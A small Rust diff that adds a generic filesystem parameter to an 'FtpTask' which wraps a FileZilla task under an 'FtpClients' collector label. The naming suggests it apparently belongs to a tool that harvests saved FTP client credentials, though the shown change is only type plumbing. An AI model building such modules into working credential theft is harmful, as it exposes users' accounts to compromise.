@@ -8,13 +8,14 @@ use crate::filezilla::FileZillaTask;
 use alloc::borrow::ToOwned;
 use alloc::vec;
 use collector::Collector;
-use tasks::{CompositeTask, Task, composite_task, impl_composite_task_runner};
+use filesystem::FileSystem;
+use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 
-pub struct FtpTask<C: Collector> {
-    inner: CompositeTask<C>,
+pub struct FtpTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
 }
 
-impl<C: Collector> Default for FtpTask<C> {
+impl<C: Collector, F: FileSystem> Default for FtpTask<C, F> {
     fn default() -> Self {
         Self {
             inner: composite_task!(FileZillaTask),
@@ -22,4 +23,4 @@ impl<C: Collector> Default for FtpTask<C> {
     }
 }
 
-impl_composite_task_runner!(FtpTask<C>, "FtpClients");
+impl_composite_task_runner!(FtpTask<C, F>, "FtpClients");
